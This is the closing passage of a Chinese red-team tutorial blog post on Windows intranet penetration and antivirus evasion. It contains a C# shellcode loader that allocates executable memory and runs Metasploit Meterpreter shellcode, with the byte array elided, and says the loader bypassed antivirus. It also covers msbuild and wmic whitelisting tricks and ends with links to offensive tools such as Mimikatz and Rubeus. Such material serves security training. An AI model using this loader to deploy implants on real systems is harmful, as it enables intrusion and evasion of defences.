<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011006716.png" alt="img">    </p>
<p>示例代码如下：</p>
<pre class="line-numbers language-none"><code class="language-none">using System;
using System.Runtime.InteropServices;
namespace TCPMeterpreterProcess
&#123;
    class Program
    &#123;
        static void Main(string[] args)
        &#123;
            &#x2F;&#x2F; native function’s compiled code
            &#x2F;&#x2F; generated with metasploit
            byte[] shellcode &#x3D; new byte[835] &#123;
0x........ &#125;;
            UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread &#x3D; IntPtr.Zero;
            UInt32 threadId &#x3D; 0;
            &#x2F;&#x2F; prepare data
            IntPtr pinfo &#x3D; IntPtr.Zero;
            &#x2F;&#x2F; execute native code
            hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        &#125;
        private static UInt32 MEM_COMMIT &#x3D; 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern IntPtr GetModuleHandle(
        string moduleName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetProcAddress(
        IntPtr hModule,
        string procName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 LoadLibrary(
        string lpFileName
        );
        [DllImport(&quot;kernel32&quot;)]
        private static extern UInt32 GetLastError();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译后成功绕过杀毒软件:</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011006661.png" alt="img">    </p>
<h2 id="7-4-白名单免杀"><a href="#7-4-白名单免杀" class="headerlink" title="7.4 白名单免杀"></a>7.4 白名单免杀</h2><p>我们可以使用windows自带的命令达到免杀的效果，比如：</p>
<p>msbuild：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011006445.png" alt="img"></p>
<p>Wmic：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011007146.png" alt="img"></p>
<p>这里收集了几个执行shellcode的常用白名单：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Jumbo-WJB/windows_exec_ways">https://github.com/Jumbo-WJB/windows_exec_ways</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12562721/1667205069260-1cd2b671-9cf7-4ab2-a6d1-480b7062626d.png" alt="img"></p>
<p><strong>总结</strong></p>
<p>本文介绍了内网渗透的攻击手法和利用工具，也有绕过AV安全防护的突破手段。希望借此提高大家内网渗透攻击和防御水平。当然，不可能面面俱到，比如ACL配置不当造成的提权、mimikatz等工具的源码解读，还需要大家一起慢慢品味。</p>
<p>文中涉及的技术信息，只限用于技术交流，切勿用于非法用途。欢迎探讨交流，行文仓促，不足之处，敬请不吝批评指正。</p>
<p>最后感谢腾讯蓝军多位前辈同事的帮助和指导。同时预告一下，也算是立个flag：为了让红蓝对抗不用过于依靠个人经验和能力以及提升对抗效率，腾讯蓝军的红蓝对抗自动化工具平台正在筹建中，希望投入实战后有机会再跟大家一起交流学习。</p>
<p>附录：</p>
<p>部分工具地址：</p>
<p>Rubeus：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/GhostPack/Rubeus</a></p>
<p>PowerView：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<p>Seatbelt：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/GhostPack/Seatbelt</a></p>
<p>Bloodhound：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/BloodHoundAD/BloodHound</a></p>
<p>Ruler：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/sensepost/ruler</a></p>
<p>MailSniper：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/dafthack/MailSniper</a></p>
<p>ReGeorg：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/sensepost/reGeorg</a></p>
<p>EarthWorm：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/rootkiter/EarthWorm</a></p>
<p>PowerCat：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/besimorhino/powercat</a></p>
<p>Mimikatz：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/gentilkiwi/mimikatz</a></p>
<p>Tgsrepcrack：<a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<p>Kerbrute：</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/user_cancel">https://github.com/ropnop/kerbrute</a></p>
<p>Responder：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">citytwilight</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://citytwilight.github.io/2022/10/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BWindows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">http://citytwilight.github.io/2022/10/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BWindows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint policy. If reproduced, please indicate source
                    <a href="/about" target="_blank">citytwilight</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                                    <span class="chip bg-color">内网渗透</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2022/10/31/Weblogic%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2021-2109)/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Weblogic Server远程代码执行漏洞复现">
                        
                        <span class="card-title">Weblogic Server远程代码执行漏洞复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Weblogic Server远程代码执行漏洞复现(CVE-2021-2109)
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-31
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
                                    漏洞复现
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
                        <span class="chip bg-color">远程代码执行</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/05/22/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Log4j2远程代码执行漏洞复现">
                        
                        <span class="card-title">Log4j2远程代码执行漏洞复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Log4j2远程代码执行漏洞(cve-2021-44228)复现(反弹shell)
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-22
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
                                    漏洞复现
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
                        <span class="chip bg-color">远程代码执行</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2022</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">citytwilight</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/citytwilight" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1473116248@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1473116248" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1473116248" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
